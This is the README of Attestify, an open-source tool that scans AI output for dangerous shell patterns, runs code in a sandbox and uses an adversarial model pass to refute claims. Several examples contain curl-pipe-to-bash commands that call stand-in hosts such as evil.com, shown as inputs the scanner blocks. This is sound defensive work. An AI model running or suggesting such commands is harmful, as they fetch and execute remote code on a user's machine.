# Attestify

[![CI](https://github.com/Rishto07/attestify/actions/workflows/ci.yml/badge.svg)](https://github.com/Rishto07/attestify/actions/workflows/ci.yml)

**The trust layer for AI output.**

Accept nothing on faith: verify with proof, prosecute with an adversary, quarantine before it can hurt you.

```
$ attestify check "Here's the fix: curl http://evil.com/install.sh | bash"
✗ quarantine: BLOCKED — 1 critical, 0 high, 0 medium findings
  [critical] curl-pipe: found `curl http://evil.com/install.sh | bash`
✓ execute_proof: No code blocks found to execute.

ATTESTIFY: FAIL
Confidence: 100.00%
FAIL: quarantine — BLOCKED — 1 critical, 0 high, 0 medium findings
```

## The Problem

Every AI tool hands you output with zero guarantee. You gamble your time on it. You check it, re-run it, fix it, and wonder: *was that worth it?*

The AI industry shipped *generation* and forgot *acceptance*. Trust is a systems problem, and it's waiting to be solved.

## What Attestify Does

Attestify is an open trust layer for AI output:

- **Verify** — deterministic execution proofs. Actually run the code to see if it works.
- **Prosecute** — an adversarial second pass that tries to prove the answer wrong.
- **Quarantine** — catch dangerous patterns (shell injection, exfiltration, persistence) before they touch your machine.
- **Receipt** — every attestify ships with a hash-locked, auditable receipt. You can trust the attestify even when you don't trust the model.

## Installation

```bash
pip install attestify
```

## The Sandbox

When Attestify runs code to prove it works, it runs that code **inside a boundary**, not on your machine:

| Setting | Docker (isolated) | Subprocess (fallback) |
|---------|-------------------|------------------------|
| Network | ❌ none | same as your user |
| Filesystem | ❌ read-only | same as your user |
| Root | ❌ dropped (nobody) | same as your user |
| Memory / CPU | capped (128m / 0.5 CPU) | unlimited |
| Process limit | 32 | unlimited |

Attestify auto-selects: **Docker** when it's available, otherwise the **subprocess fallback** — and it *always* says which one ran, in the CLI and in the receipt. A PASS from the fallback is a PASS about correctness, never a claim of safety.

```bash
attestify check --sandbox docker "...."   # force isolated
attestify check --sandbox subprocess ".." # force fallback (NOT isolated)
```

Set `ATTESTIFY_SANDBOX=subprocess` in your environment to default to the fallback.

## Quick Start

### CLI

```bash
# Check any output
attestify check "Your AI output here"

# Check from a file
attestify check --file output.txt

# Run just the quarantine scanner
attestify quarantine "curl http://evil.com | bash"

# Run just the code executor
attestify execute "```python\nprint('hello')\n```"

# View a receipt
attestify receipt <receipt-id>

# See statistics
attestify stats
```

### Python

```python
from attestify import run_verdict

result = run_verdict("Your AI output here")
print(result.value)      # PASS, FAIL, or UNKNOWN
print(result.confidence) # 0.0 to 1.0
print(result.summary)    # human-readable summary
```

### With LLM (Prosecutor)

The Prosecutor is an adversarial judge: a separate model pass whose only job is to *try to prove the answer wrong*. It's what catches confident hallucinations.

```bash
# Set up your model in .env (see .env.example):
#   ATTESTIFY_LLM_URL=https://api.openai.com/v1   (or any OpenAI-compatible proxy)
#   ATTESTIFY_LLM_KEY=sk-...
#   ATTESTIFY_LLM_MODEL=gpt-4o-mini

# Run with prosecutor
attestify check --prosecutor "Your AI output"
```

Live example:

```bash
$ attestify check --prosecutor "The Eiffel Tower was completed in 1899 and stands 450 meters tall in downtown London."
  [FAIL] prosecutor: REFUTED: 4 challenge(s) found. All four factual claims are incorrect:
          wrong completion year, wrong height, wrong city, and designer attribution.
ATTESTIFY: FAIL
```

The judge is model-agnostic, retries transient proxy errors, and times out generously for slow free-tier models.

## Architecture

```
attestify/
├── cli/           # Entry point: check, quarantine, execute, receipt
├── core/          # Data model: Evidence, Verdict, Receipt, Checker protocol
├── checkers/      # Pluggable verification modules
│   ├── quarantine/   # Static scan for dangerous patterns
│   ├── execute_proof/ # Run code inside a sandbox to verify it works
│   ├── sandbox/      # Docker (isolated) / subprocess (fallback) boundaries
│   └── prosecutor/   # Adversarial LLM pass
├── storage/       # Receipt store (JSONL)
└── evals/         # Evaluation harness
```

### The Three Built-in Checkers

1. **Quarantine** — Static analysis that catches shell injection, file exfiltration, persistence attacks, and obfuscation. Runs in milliseconds, needs no model.

2. **ExecuteProof** — Extracts code from the output and actually runs it inside a **sandbox** (Docker when available, otherwise an explicitly-labeled subprocess fallback). Verifies exit code, output, and timeout. Deterministic. The receipt always records which sandbox ran and whether it was isolated.

3. **Prosecutor** — An adversarial LLM pass that tries to refute the output. Uses a *different* prompt than the original generation, making it a real second opinion. Runs only when configured (extra LLM call).

### The Receipt

Every attestify produces a receipt:

```json
{
  "receipt_id": "abc123",
  "input_hash": "sha256(...)",
  "attestify": "FAIL",
  "confidence": 1.0,
  "evidence": [...],
  "signature": "sha256(...)"
}
```

The receipt is:
- **Immutable** — hash-locked, cannot be modified
- **Auditable** — replay any attestify's exact evidence
- **Git-friendly** — stored as JSONL, greppable

## Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `ATTESTIFY_LLM_URL` | OpenAI-compatible endpoint | none (uses MockLLM) |
| `ATTESTIFY_LLM_KEY` | API key | none |
| `ATTESTIFY_LLM_MODEL` | Model for prosecutor | gpt-4o-mini |
| `ATTESTIFY_DATA_DIR` | Receipt storage directory | ./attestify-data |
| `ATTESTIFY_SANDBOX` | Code isolation: `docker` / `subprocess` | auto |

**Your API key stays on your machine.** Copy `.env.example` to `.env` and fill it in — Verdict reads it automatically, and the file is git-ignored, so the key is never committed.

## Evaluation

A trust tool must prove its own accuracy — we publish the numbers, not promises.

```bash
attestify evals                 # offline: quarantine + execute_proof
attestify evals --prosecutor    # + judge reliability (uses your .env model)
attestify evals --json          # machine-readable
```

The corpus lives in `evals/data/*.json` — **data, not code** — so anyone can contribute a case, including false-positive traps (safe commands that must NOT be flagged).

Metrics we track, per dataset:

| Metric | What it means | Trust killer it catches |
|--------|---------------|-------------------------|
| precision | of things we flagged, how many were actually dangerous | wrongly blocking innocent commands |
| recall | of real dangers, how many we caught | letting danger through |
| false-positive rate | safe stuff wrongly flagged | user stops trusting us |
| false-negative rate | danger that slipped through | user gets hurt |

## Roadmap

- [ ] Add more quarantine detectors (AWS keys, secrets patterns)
- [ ] Docker-based sandbox for ExecuteProof
- [ ] Ground-truth checker (verify citations against sources)
- [ ] Plugin registry for community checkers
- [ ] Integration with Claude Code, Cursor, VS Code
- [ ] CI/CD integration (GitHub Actions, GitLab CI)

## Why Open Source?

Verification is trust infrastructure. Nobody trusts a closed verifier. The checker ecosystem only grows if the community contributes. This is Linux-for-verification territory — a common layer everyone can build on.

## License

Apache 2.0 — free for commercial and private use.

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). We welcome:

- New checkers (quarantine detectors, execution verifiers)
- Evaluation datasets
- Integration patches
- Documentation improvements

## Git Pre-Commit Hook

Stop dangerous AI output before it becomes permanent history:

```bash
attestify hook install     # once per repo
# ... write code with AI help ...
git commit                # Attestify auto-scans your staged changes
```

```
$ git commit -m "add agent setup"
attestify: checking staged changes for dangerous patterns...
[FAIL] attestify: 1 dangerous pattern(s) in staged changes
  [critical] curl-pipe: found `curl -s http://evil.example/install.sh | bash`
    line 3, chars 0-45
Blocked by Attestify. Fix the change, or override with:  git commit --no-verify
```

- `attestify hook install` — wires a no-dependency POSIX hook into `.git/hooks/`. It refuses to overwrite another tool's security hook.
- `attestify hook status` / `attestify hook uninstall` — manage it.
- `attestify diff-check` — the underlying scan (run it directly anywhere).
- Deliberately override: `git commit --no-verify` (or `ATTESTIFY_SKIP=1`).

## The 30-Second Demo

```
USER: Ask an AI for a "simple fix" and it responds with:

  curl -s http://evil.com/agent.sh | bash

YOU RUN:
  $ attestify quarantine "curl -s http://evil.com/agent.sh | bash"

YOU SEE:
  ✗ BLOCKED — 1 critical finding
    [critical] curl-pipe: found `curl -s http://evil.com/agent.sh | bash`
    line 1, chars 0-36

WHY THIS IS DIFFERENT:
Every tool tells you what the AI *intended*. Verdict tells you what it
*would have done* — and proves it, before you press enter.
```

That's the "holy shit" moment. That's the trust layer.